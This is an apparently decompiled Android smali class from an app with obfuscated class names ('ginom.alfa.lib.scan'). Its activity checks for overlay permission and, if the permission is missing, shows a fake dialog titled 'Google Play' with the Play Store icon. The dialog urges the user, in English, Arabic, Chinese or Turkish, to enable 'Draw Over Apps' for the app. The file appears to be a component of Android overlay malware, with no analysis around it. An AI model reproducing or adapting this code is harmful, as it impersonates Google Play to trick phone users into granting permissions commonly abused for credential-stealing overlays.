.class public Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10;
.super Landroid/app/Activity;
.source "dxlbsscglsusjhhogsrbakyxn10.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 24
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private AskDraw()V
    .locals 10

    .line 26
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v0

    .line 28
    new-instance v1, Landroid/app/AlertDialog$Builder;

    invoke-direct {v1, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    const/4 v2, 0x0

    const/4 v3, 0x3

    .line 35
    :try_start_0
    invoke-virtual {p0}, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10;->getPackageName()Ljava/lang/String;

    move-result-object v4

    .line 36
    invoke-virtual {p0}, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-virtual {v5}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v5

    .line 38
    invoke-virtual {v5, v4, v2}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v4

    if-eqz v4, :cond_0

    .line 39
    invoke-virtual {v5, v4}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v4

    goto :goto_0

    :cond_0
    sget-object v4, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->c_etepaejhucdoifemyubbjerbt111_mn:[Ljava/lang/String;

    aget-object v4, v4, v3

    :goto_0
    check-cast v4, Ljava/lang/String;

    check-cast v4, Ljava/lang/String;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    const-string v4, ""

    :goto_1
    const/4 v5, -0x1

    .line 44
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v6

    const/16 v7, 0xc31

    const/4 v8, 0x2

    const/4 v9, 0x1

    if-eq v6, v7, :cond_4

    const/16 v7, 0xc6b

    if-eq v6, v7, :cond_3

    const/16 v7, 0xca9

    if-eq v6, v7, :cond_2

    const/16 v2, 0xe7e

    if-eq v6, v2, :cond_1

    goto :goto_2

    :cond_1
    const-string v2, "tr"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    const/4 v2, 0x3

    goto :goto_3

    :cond_2
    const-string v6, "en"

    invoke-virtual {v0, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    goto :goto_3

    :cond_3
    const-string v2, "cn"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    const/4 v2, 0x2

    goto :goto_3

    :cond_4
    const-string v2, "ar"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    const/4 v2, 0x1

    goto :goto_3

    :cond_5
    :goto_2
    const/4 v2, -0x1

    :goto_3
    const-string v0, "Enable Draw Over Apps For: "

    const-string v5, "Cancel"

    if-eqz v2, :cond_9

    if-eq v2, v9, :cond_8

    if-eq v2, v8, :cond_7

    if-eq v2, v3, :cond_6

    .line 68
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v0, "OK"

    goto :goto_4

    .line 63
    :cond_6
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "di\u011fer uygulamalar \u00fczerinde \u00e7izimi etkinle\u015ftir:"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v0, "Tamam"

    const-string v5, "iptal"

    goto :goto_4

    .line 58
    :cond_7
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "\u8bf7\u542f\u7528\uff0c\u663e\u793a\u5728\u5e94\u7528\u7a0b\u5e8f:"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v0, "\u4f7f\u80fd\u591f"

    const-string v5, "\u53d6\u6d88"

    goto :goto_4

    .line 53
    :cond_8
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "\u062a\u0645\u0643\u064a\u0646 \u060c \u0627\u0644\u0625\u0638\u0647\u0627\u0631 \u0641\u0648\u0642 \u0627\u0644\u062a\u0637\u0628\u064a\u0642\u0627\u062a \u0644\u0640: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v0, "\u062a\u0641\u0639\u064a\u0644"

    const-string v5, "\u0625\u0644\u063a\u0627\u0621"

    goto :goto_4

    .line 48
    :cond_9
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    const-string v0, "Enable"

    .line 73
    :goto_4
    :try_start_1
    invoke-virtual {p0}, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    const-string v3, "com.android.vending"

    invoke-virtual {v2, v3}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v2

    .line 74
    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;

    const-string v2, "Google Play"

    .line 75
    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_1
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_5

    .line 80
    :catch_1
    :try_start_2
    invoke-virtual {p0}, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {p0}, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v2

    .line 81
    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;

    .line 82
    invoke-virtual {v1, v4}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_2
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_2 .. :try_end_2} :catch_2

    .line 90
    :catch_2
    :goto_5
    new-instance v2, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10$1;

    invoke-direct {v2, p0}, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10$1;-><init>(Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10;)V

    invoke-virtual {v1, v0, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 99
    new-instance v0, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10$2;

    invoke-direct {v0, p0}, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10$2;-><init>(Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10;)V

    invoke-virtual {v1, v5, v0}, Landroid/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 106
    new-instance v0, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10$3;

    invoke-direct {v0, p0}, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10$3;-><init>(Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10;)V

    invoke-virtual {v1, v0}, Landroid/app/AlertDialog$Builder;->setOnCancelListener(Landroid/content/DialogInterface$OnCancelListener;)Landroid/app/AlertDialog$Builder;

    .line 114
    invoke-virtual {v1}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;

    return-void
.end method


# virtual methods
.method public finish()V
    .locals 2

    const/4 v0, 0x0

    .line 218
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->shown:Ljava/lang/Boolean;

    .line 219
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    if-lt v0, v1, :cond_0

    .line 220
    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    goto :goto_0

    .line 223
    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    :goto_0
    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 0

    .line 172
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    if-nez p1, :cond_1

    const/4 p1, -0x1

    if-ne p2, p1, :cond_0

    .line 178
    invoke-virtual {p0}, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10;->finish()V

    goto :goto_0

    :cond_0
    if-nez p2, :cond_1

    .line 181
    invoke-virtual {p0}, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10;->finish()V

    :cond_1
    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 1

    .line 122
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/4 p1, 0x1

    .line 125
    :try_start_0
    invoke-virtual {p0, p1}, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10;->requestWindowFeature(I)Z

    .line 126
    invoke-virtual {p0}, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10;->getWindow()Landroid/view/Window;

    move-result-object p1

    const/16 v0, 0x400

    invoke-virtual {p1, v0, v0}, Landroid/view/Window;->setFlags(II)V

    .line 130
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x17

    if-lt p1, v0, :cond_1

    .line 131
    invoke-static {p0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_0

    .line 132
    invoke-direct {p0}, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10;->AskDraw()V

    goto :goto_0

    .line 135
    :cond_0
    invoke-virtual {p0}, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10;->finish()V

    goto :goto_0

    .line 139
    :cond_1
    invoke-virtual {p0}, Lginom/alfa/lib/scan/dxlbsscglsusjhhogsrbakyxn10;->finish()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :goto_0
    return-void
.end method
